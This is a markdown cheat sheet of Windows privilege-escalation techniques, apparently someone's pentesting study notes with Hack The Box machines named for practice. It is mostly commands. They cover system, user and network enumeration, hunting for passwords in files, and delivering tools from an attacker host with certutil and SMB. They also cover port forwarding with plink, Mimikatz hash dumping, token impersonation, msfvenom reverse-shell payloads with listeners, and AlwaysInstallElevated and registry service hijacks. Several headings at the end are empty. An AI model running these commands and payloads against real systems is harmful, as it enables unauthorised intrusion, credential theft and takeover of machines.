## Initial Enumeration
**System Enumeration**
- `systeminfo`
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
- Extract Patching: `wmic qfe` 
	- `wmic qfe get Caption,Description,HotFixID,InstalledOn`
- Logical Disk: `wmic logicaldisk`

**User Enumeration**
- View current privilege: `whoami /priv`
- Enumerate groups: `whoami /groups`
- Enumerate users on machine: `net user`
- View users details: `net user <username>`
- Enumerate group: `net localgroup`
- Enumerate specific group: `net localgrop <groupname>`

**Network Enumeration**
- `ipcofig`
- `ipconfig /all`
- If it is on AD, we can get DC which is configured as DNS server 
- `arp -a` : If there is another IP on the table, enumerate it as well. How is that IP is communicating to our machine.
- Routing table: `route print` 
- Sometimes we don't need to elevate but we need to pivot to another machine to grab the privileges.
- `netstat -ano`: See what's port are out there. It might show the ports which are not shown during the scanning.

**Password Hunting**
- `findstr /si password *.txt`
- `findstr /si password *.txt *.ini *.config *.sql`
- Find all those strings in config files.
	- `dir /s "pass" == "cred" == "vnc" == ".config"`
- Find all passwords in all files..
	- `findstr /spin "password" "."`
- More ways to find passwords in different files [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords)

**AV Enumeration**
- View windows defender: `sc query windefend`
- View what are the service (to view antivirus running): `sc queryex type=service`
- View firewall state
	- `netsh advfirewall firewall dump`
	- `netsh firewall show state`
- View firewall config
	- `firewall show config`

## Exploring Automated Tools
**Some Automated Tools**
- WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
- Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
- Sherlock - https://github.com/rasta-mouse/Sherlock
- Watson - https://github.com/rasta-mouse/Watson
- PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- JAWS - https://github.com/411Hall/JAWS
- Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
- Seatbelt - https://github.com/GhostPack/Seatbelt
- SharpUp - https://github.com/GhostPack/

**Tools Delivery**
- Create a SMB Server in you machine.
- `impacket-smbserver.py <shareName> <sharePath> -smb2support`
	- where, shareName is the name to which SMB will be connected and sharePath is the directory to which attacker is hosting, '.' to host current directory.
- In victim machine,
- Connect
	- `net use \\[host]\[shareName]`
- Copy the file to victim
	- `copy \\[host]\[shareName]\tools.exe \windows\temp\a.exe`
- Close the connection
	- `net use /d \\[host]\[shareName]`
- For more ways to transfer the files: https://medium.com/@dr.spitfire/ocsp-file-transfer-recipe-for-delicious-post-exploitation-a407e00f7346
- We can also use certutil to download the file from windows cmd.
- In attacker machine
	- `python3 -m http.server 1337`
- In victim's machine
	- `certutil -urlcache -f http://<attacker-ip>:1337/test.exe test.exe`

## Escalation Path: Kernel Exploits
**Escalation with Metasploit**
- After Metrepreter
	- `run post/multi/recon/local_exploit_suggester`

**Manual Kernel Exploitation**
- In windows PS
	- `systeminfo`
	- Copy the data from above commands.
- In attacker machine
	- Save the data in a text file
	- `windows-exploit-suggester.py --database <db-date>.xlsx --systeminfo systeminfo.txt `
- Windows Kernel Exploits - https://github.com/SecWiki/windows-kernel-exploits

## Escalation Path: Stored Passwords and Port Forwarding
 - Sometimes there are servies that are only accessible from inside the nnetwork. These services might be vulnerable since they are not meant to be seen from the outside
 - View such ports cmd: `netstat -ano`, suppose you got port 445
 - Open an SSH server on an attacker machine
- Fort port using [plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) in windows
	- `plink.exe -l <attackerusername> -pw <attackerpassword> <attackerIP> -R 445:127.0.0.1:445`
- `winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"`

## Escalation Path: Windows Subsystem for Linux
- Find out if wsl.exe and bash.exe exists on the windows machine.
	- `where /R c:\windows bash.exe`
	- `where /R c:\windows wsl.exe`
- Check if wsl.exe returns root
	- `wsl.exe whoami`
	- `wsl.exe python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'`
- HTB to practice "SecNotes"

## Impersonation and Potato Attacks
**Token Impersonation with Incognito**
- View if the user has a privilege to impersonate token
	- `whoami /priv`
- We can load incognito from meterpreter shell.
  - `load incognito`
  - `help` - It will show incognito command
  - `list_tokens -u` : List the tokens, we can impersonate the listed users.
  - `impersonate_token marvel\\administrator`
  - `shell`
  - `whoami`
- Attempt to dump hashes as Domain Admin
	- `Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /patch" exit' -Computer HYDRA.marvel.local`
	- `# privilege::debug`
	- `# LSADump::LSA /patch`

**Potato Attacks**
- This attack can be possible when you have `SeImpersonnate` or `SeAssignPrimaryToken` privileges. See via `whoami /priv`
- More about Rotten Potato: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
- More about Juicy Potato: https://github.com/ohpe/juicy-potato
- HTB to practice: Jeeves

## Escalation Path: getsystem
- Sometimes, Meterpreter elevates you from a local administrator to the SYSTEM user using `getsystem` command
- In Meterpreter
	- `getsystem`
- More on:  https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

## Escalation Path: RunAs
- Allows a user to run specific tools and programs with different permissions than the user's current logon provides.
- View the current listed/stored credentials
	- `cmdkey /list`
- `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt`
- HTB to practice: Access

## Escalation Path: Registry
**Autoruns**
- Check for if any [autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns) is available on the system.
- `Autoruns.exe`
- Analyse the programs and we can check their access with [accesschk64](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
- `accesschk64.exe -wvu "C:\Program Files\Autorun Program"`
- If everyone has read, write access on file that automatically runs, we can make somebody else run it as administrator.
- Using Powerup.
	- `. .\PowerUp.ps1`
	- `Invoke-AllChecks`
	- Check the output: Checking for modifidable registry autoruns and configs
- Create a reverse payload
	- `msfvenom -p windows/meterpreter/reverse_tcp lhost=<attacker-IP> -f exe -o program.exe`
- Using metasploit
	- `use multi/handler`
  - `set payload windows/meterpreter/reverse_tcp`
  - `set lhost <attacker-ip>`
  - `run`
- Delivery
	- Move the program.exe on the windows machine
	- `python3 -m http.server 1337`
  - In windows machine, download the file under `C:\Program Files\Autorun Program`
- Once a high privilege user run the programs, a reverse shell is gained in metasploit

**AlwaysInstallElevated**
- The windows installer is a utility which through the use MSI packages can install new software. The AlawysInstallElevated is a Windows policy that allows unprivileged users to install software through the use of MSI packages using SYSTEM level permissions, which can be exploited to gain administrative access over a Windows machine.
- Check whether the required registry keys are enabled.
	- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
	- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
	- The value in following registry keys has to be set to 1.
- Check using winpeas.
	- `winpeas.exe quiet systeminfo`
- Exploitation
	- Payload Generation
		- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f msi > shell.msi`
	- Delivery
		- `python3 -m http.server 1337`
	- Download
		- `certutil -urlcache -split -f "http://<attacker-ip>:1337/shell.msi" shell.msi`
	- Netcat Listener
		- `nc -lvnp 4444`
	- The following command can then be used to install the .msi file
		- `msiexec /quiet /qn /i shell.msi`
- Using Metasploit
	- In Meterpreter
		- `background`
		- `search alwaysinstallelevated`
		- `use /eploit/windows/local/always_install_elevated`
		- `set session 1`
		- `exploit`
- More on: https://steflan-security.com/windows-privilege-escalation-alwaysinstallelevated-policy/

**Service Escalation - regsvc**
- Detection
	- Open powershell prompt and type: `Get-Acl hklm:\System\CurrentControlSet\services\regsvc | fl`
	- Notice that the output suggests that user belong to "NT AUTHORITY\INTERACTIVE" has "FullControl" permission over the registry key.
	- If Authenticated Users or NT AUTHORITY/INTERACTIVE have FullControl in any of the services, in that case, you can change the binary that is going to be executed by the service.
- Exploitation
	- Modify the `ImagePath` key of the registry to your payload path and restart the service.
	- ` reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\Temp\shell.exe /f`
	- `sc start regsvc`
- More on: https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842
- Detailed on: https://systemweakness.com/windows-privilege-escalation-weak-registry-permissions-9060c1ca7c10

## Escalation Path: Executable Files

## Escalation Path: Startup Applications

## Escalation Path: DLL Hijacking

## Escalation Path: Service Permissions (Paths)

## Escalation Path: CVE-2019-1388


